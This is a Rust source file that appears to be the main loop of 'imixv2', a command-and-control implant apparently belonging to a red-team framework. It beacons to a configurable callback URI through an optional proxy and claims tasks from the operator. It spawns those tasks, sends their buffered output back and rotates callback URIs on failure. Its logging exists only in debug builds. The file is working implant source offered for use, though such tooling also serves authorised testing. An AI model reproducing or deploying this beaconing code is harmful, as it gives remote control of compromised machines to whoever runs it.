use anyhow::Result;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use crate::agent::ImixAgent;
use crate::task::TaskRegistry;
use crate::version::VERSION;
use pb::config::Config;
use transport::{ActiveTransport, Transport};

pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);

pub async fn run_agent() -> Result<()> {
    init_logger();

    // Load config / defaults
    let config = Config::default_with_imix_verison(VERSION);

    // Initial transport is just a placeholder, we create active ones in the loop
    let transport = ActiveTransport::init();

    let handle = tokio::runtime::Handle::current();
    let task_registry = Arc::new(TaskRegistry::new());
    let agent = Arc::new(ImixAgent::new(
        config,
        transport,
        handle,
        task_registry.clone(),
    ));

    #[cfg(debug_assertions)]
    log::info!("Agent initialized");

    while !SHUTDOWN.load(Ordering::Relaxed) {
        let start = Instant::now();
        let agent_ref = agent.clone();
        let registry_ref = task_registry.clone();

        run_agent_cycle(agent_ref, registry_ref).await;

        if SHUTDOWN.load(Ordering::Relaxed) {
            break;
        }

        sleep_until_next_cycle(&agent, start).await;
    }

    #[cfg(debug_assertions)]
    log::info!("Agent shutting down");

    Ok(())
}

pub fn init_logger() {
    #[cfg(debug_assertions)]
    {
        use pretty_env_logger;
        let _ = pretty_env_logger::formatted_timed_builder()
            .filter_level(log::LevelFilter::Info)
            .parse_env("IMIX_LOG")
            .try_init();
        log::info!("Starting imixv2 agent");
    }
}

async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<TaskRegistry>) {
    // Refresh IP
    agent.refresh_ip().await;

    // Create new active transport
    let (callback_uri, proxy_uri) = agent.get_transport_config().await;

    let transport = match ActiveTransport::new(callback_uri, proxy_uri) {
        Ok(t) => t,
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to create transport: {_e:#}");
            agent.rotate_callback_uri().await;
            return;
        }
    };

    // Set transport
    agent.update_transport(transport).await;

    // Claim Tasks
    process_tasks(&agent, &registry).await;

    // Flush Outputs (send all buffered output)
    agent.flush_outputs().await;

    // Disconnect (drop transport)
    agent.update_transport(ActiveTransport::init()).await;
}

async fn process_tasks(agent: &ImixAgent<ActiveTransport>, registry: &TaskRegistry) {
    match agent.claim_tasks().await {
        Ok(tasks) => {
            if tasks.is_empty() {
                #[cfg(debug_assertions)]
                log::info!("Callback success, no tasks to claim");
                return;
            }
            for task in tasks {
                #[cfg(debug_assertions)]
                log::info!("Claimed task: {}", task.id);

                registry.spawn(task, Arc::new(agent.clone()));
            }
        }
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Callback failed: {_e:#}");
            agent.rotate_callback_uri().await;
        }
    }
}

async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) {
    let interval = agent.get_callback_interval_u64();
    let delay = match interval.checked_sub(start.elapsed().as_secs()) {
        Some(secs) => Duration::from_secs(secs),
        None => Duration::from_secs(0),
    };
    #[cfg(debug_assertions)]
    log::info!(
        "Callback complete (duration={}s, sleep={}s)",
        start.elapsed().as_secs(),
        delay.as_secs()
    );
    tokio::time::sleep(delay).await;
}
